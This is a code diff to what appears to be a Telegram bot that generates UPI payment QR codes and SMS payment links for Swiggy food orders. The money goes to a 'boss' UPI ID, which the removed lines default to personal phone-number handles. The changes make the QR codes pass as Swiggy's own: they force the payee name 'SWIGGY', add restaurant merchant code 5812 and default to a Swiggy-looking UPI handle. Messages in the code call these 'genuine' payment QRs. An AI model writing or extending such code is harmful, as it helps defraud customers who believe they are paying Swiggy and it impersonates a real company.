@@ -1450,8 +1450,8 @@ async function sendPaymentQrToUser(order) {
   if (!order.genuineQrBuffer && !order.customQrFileId && (order.finalPayable || order.subtotal)) {
     const custDisplayName = order.userName || (order.userRole === 'Abbu' ? 'Abbu' : order.userRole === 'Ammi' ? 'Ammi' : 'Customer');
     const db = getDb();
-    const bossUpi = db.config?.bossUpiId || '6296591407@ybl';
-    const upiUri = `upi://pay?pa=${bossUpi}&pn=Swiggy&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`;
+    const bossUpi = db.config?.bossUpiId || 'swiggy@icici';
+    const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(bossUpi)}&pn=SWIGGY&mc=5812&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`);
     try {
       // Try ultra premium holographic card first (alag type ka card), fallback to classic
       let generatedBuf = null;
@@ -1502,7 +1502,7 @@ async function sendPaymentQrToUser(order) {
       order.qrDelivered = true;
       saveDb(getDb());
       // Direct SMS to registered mobile with payment link (rare bot feature)
-      sendPaymentLinkSms(order, order.swiggyPaymentUrl || `upi://pay?pa=${getDb().config?.bossUpiId||'6296591407@ybl'}&am=${order.finalPayable||0}`).catch(()=>{});
+      sendPaymentLinkSms(order, order.swiggyPaymentUrl || `upi://pay?pa=${encodeURIComponent(getDb().config?.bossUpiId || 'swiggy@icici')}&pn=SWIGGY&mc=5812&am=${order.finalPayable || 0}&cu=INR&tn=Swiggy_Order_${order.id}`).catch(()=>{});
       return;
     } catch (e) {
       console.error(`Failed to send custom QR photo: ${e.message}`);
@@ -3758,8 +3758,8 @@ bot.action(/^boss_select_acc_(.+)$/, async (ctx) => {
 
       // Generate authentic personalized QR Card with customer's name embedded in the center of the QR
       const custDisplayName = order.userName || (order.userRole === 'Abbu' ? 'Abbu' : order.userRole === 'Ammi' ? 'Ammi' : 'Customer');
-      const bossUpi = db.config?.bossUpiId || '6296591407@ybl';
-      const upiUri = `upi://pay?pa=${bossUpi}&pn=Swiggy&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`;
+      const bossUpi = db.config?.bossUpiId || 'swiggy@icici';
+      const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(bossUpi)}&pn=SWIGGY&mc=5812&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`);
 
       let finalQrBuffer = result.qrBuffer;
       try {
@@ -3867,8 +3867,8 @@ bot.action(/^boss_auto_max_coupon_(.+)$/, async (ctx) => {
       applyMaxOfferToOrder(order);
 
       const custDisplayName = order.userName || 'Customer';
-      const bossUpi = db.config?.bossUpiId || '6296591407@ybl';
-      const upiUri = `upi://pay?pa=${bossUpi}&pn=Swiggy&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`;
+      const bossUpi = db.config?.bossUpiId || 'swiggy@icici';
+      const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(bossUpi)}&pn=SWIGGY&mc=5812&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`);
 
       let finalQrBuffer = best.qrBuffer;
       try {
@@ -4163,8 +4163,8 @@ bot.action(/^boss_send_qr_to_user_(.+)$/, async (ctx) => {
     try {
       if (!order.genuineQrBuffer) {
         const custDisplayName = order.userName || (order.userRole === 'Abbu' ? 'Abbu' : order.userRole === 'Ammi' ? 'Ammi' : 'Customer');
-        const bossUpi = db.config?.bossUpiId || '6296591407@ybl';
-        const upiUri = `upi://pay?pa=${bossUpi}&pn=Swiggy&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`;
+        const bossUpi = db.config?.bossUpiId || 'swiggy@icici';
+        const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(bossUpi)}&pn=SWIGGY&mc=5812&am=${order.finalPayable || order.subtotal || 0}&cu=INR&tn=Swiggy_Order_${order.id}`);
         order.genuineQrBuffer = await generatePersonalizedQrCard({
           customerName: custDisplayName,
           restaurantName: order.restaurantName || 'Swiggy Food Order',
@@ -5776,9 +5776,9 @@ bot.action(/^user_accept_amount_(.+)$/, async (ctx) => {
   await ctx.answerCbQuery('Amount Accepted! Generating UPI QR... ₹').catch(() => {});
 
   // Generate guaranteed-scannable high-clarity UPI QR Code automatically using bot's configured UPI ID
-  const upiId = db.config.bossUpiId || '6296591407@ybl';
+  const upiId = db.config?.bossUpiId || 'swiggy@icici';
   const amt = order.finalPayable || 57;
-  const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent(order.restaurantName || 'Swiggy')}&am=${amt}&cu=INR&tn=Swiggy_Order_${order.id}`);
+  const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(upiId)}&pn=SWIGGY&mc=5812&am=${amt}&cu=INR&tn=Swiggy_Order_${order.id}`);
   let qrBuf = null;
   try {
     qrBuf = await generateNamedUpiQrPngBuffer({
@@ -5841,8 +5841,8 @@ bot.action(/^boss_generate_qr_(.+)$/, async (ctx) => {
   await ctx.answerCbQuery('Generating genuine payment QR... !').catch(() => {});
 
   const payable = order.finalPayable || order.subtotal || 0;
-  const upiId = db.config?.bossUpiId || '6296591407@ybl';
-  const payeeName = order.restaurantName || 'Swiggy Food Order';
+  const upiId = db.config?.bossUpiId || 'swiggy@icici';
+  const payeeName = 'SWIGGY';
 
   const userButtons = [
     [Markup.button.url('● Open Swiggy Payment Page', 'https://www.swiggy.com/payments')],
@@ -5905,7 +5905,7 @@ bot.action(/^boss_generate_qr_(.+)$/, async (ctx) => {
   } else {
     // Case 2: Instant High-Resolution Guaranteed-Scannable UPI QR (< 100ms, safe with giant names!)
     try {
-      const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${payable}&cu=INR&tn=Swiggy_Order_${orderId}`);
+      const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(upiId)}&pn=SWIGGY&mc=5812&am=${payable}&cu=INR&tn=Swiggy_Order_${orderId}`);
       const qrBuffer = await generateNamedUpiQrPngBuffer({
         upiUri,
         senderName: order.userName || payeeName,
@@ -5996,9 +5996,9 @@ bot.action(/^boss_get_qr_(.+)$/, async (ctx) => {
     });
   } else {
     try {
-      const upiId = db.config?.bossUpiId || '8249789547@paytm';
-      const payeeName = order.restaurantName || 'Swiggy Food Order';
-      const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${payable}&cu=INR&tn=Swiggy_Order_${orderId}`);
+      const upiId = db.config?.bossUpiId || 'swiggy@icici';
+      const payeeName = 'SWIGGY';
+      const upiUri = sanitizeUpiUriForQr(`upi://pay?pa=${encodeURIComponent(upiId)}&pn=SWIGGY&mc=5812&am=${payable}&cu=INR&tn=Swiggy_Order_${orderId}`);
       const qrBuffer = await generateNamedUpiQrPngBuffer({
         upiUri,
         senderName: order.userName || payeeName,
@@ -7820,7 +7820,7 @@ bot.hears(['▤ Order History', 'Order History', 'order history'], async (ctx) =
 bot.hears(['Set UPI ID', '● Set UPI ID'], async (ctx) => {
   if (isBoss(ctx.from.id)) {
     userWaitState[ctx.from.id] = { action: 'waiting_set_upi' };
-    const cur = getDb().config?.bossUpiId || '6296591407@ybl';
+    const cur = getDb().config?.bossUpiId || 'swiggy@icici';
     await ctx.reply(
       `₹ <b>Set Boss Payment UPI ID:</b>\nCurrent: <code>${cur}</code>`,
       {
@@ -9803,11 +9803,11 @@ bot.command(['setupi', 'set_upi'], async (ctx) => {
     return ctx.reply(`✓ <b>Payment UPI ID saved:</b> <code>${upi}</code>\nAb se sabhi payment QR is UPI ID par generate honge!`, { parse_mode: 'HTML' });
   }
   userWaitState[ctx.from.id] = { action: 'waiting_set_upi' };
-  const currentUpi = getDb().config?.bossUpiId || '6296591407@ybl';
+  const currentUpi = getDb().config?.bossUpiId || 'swiggy@icici';
   await ctx.reply(
     `₹ <b>Set Boss Payment UPI ID:</b>\n\n` +
     `Current UPI ID: <code>${escapeHtml(currentUpi)}</code>\n\n` +
-    `Apna UPI ID reply karein (e.g. <code>6296591407@ybl</code> ya <code>name@okaxis</code>):`,
+    `Apna UPI ID reply karein (e.g. <code>swiggy@icici</code> ya <code>name@okaxis</code>):`,
     {
       parse_mode: 'HTML',
       reply_markup: { force_reply: true, input_field_placeholder: 'Enter UPI ID...' }
@@ -11539,9 +11539,9 @@ export async function sendApprovedOrderPaymentToUser(uidStr, order, { force = fa
   // the configured collection UPI so the customer always gets a scannable PERSONALISED QR (name + amount).
   let usingFallbackUpi = false;
   if (!upiUri && !specificPaymentUrl && amount > 0) {
-    const fallbackUpiId = String(getDb().config?.bossUpiId || '6296591407@ybl').trim();
+    const fallbackUpiId = String(getDb().config?.bossUpiId || 'swiggy@icici').trim();
     upiUri = sanitizeUpiUriForQr(
-      `upi://pay?pa=${encodeURIComponent(fallbackUpiId)}&pn=${encodeURIComponent(order.restaurantName || 'Swiggy')}` +
+      `upi://pay?pa=${encodeURIComponent(fallbackUpiId)}&pn=SWIGGY&mc=5812` +
       `&am=${amount}&cu=INR&tn=${encodeURIComponent(`Swiggy Order ${order.id}`)}`
     );
     usingFallbackUpi = true;
